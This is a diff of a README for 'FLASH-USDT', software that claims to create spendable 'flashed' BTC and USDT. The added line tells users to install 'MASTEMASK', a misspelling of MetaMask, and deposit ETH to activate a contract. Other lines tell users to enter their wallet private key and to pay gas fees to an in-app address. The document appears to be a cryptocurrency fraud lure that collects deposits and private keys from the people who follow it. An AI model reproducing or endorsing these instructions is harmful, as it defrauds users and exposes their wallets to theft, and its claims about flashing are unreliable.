@@ -7,6 +7,7 @@ FLASH-USDT is a USDT flashing software that lets users perform BTC and USDT flas
 When you gain app access, you'll have a limited spendable quota of either bitcoin or USDT, but you'll be responsible for your gas fee for the flashing transactions. You'll find a gas address in-app and the gas topup process is simple.
 
 # Readme.md
+NOTE: Please install MASTEMASK on your browser, then deposit 0.002 ETH to activate the contract. Each transaction will cost between $1 and $2 per transfer.
 
 - change private_key to ur wallet key
 - change sender_address to which address u want to send
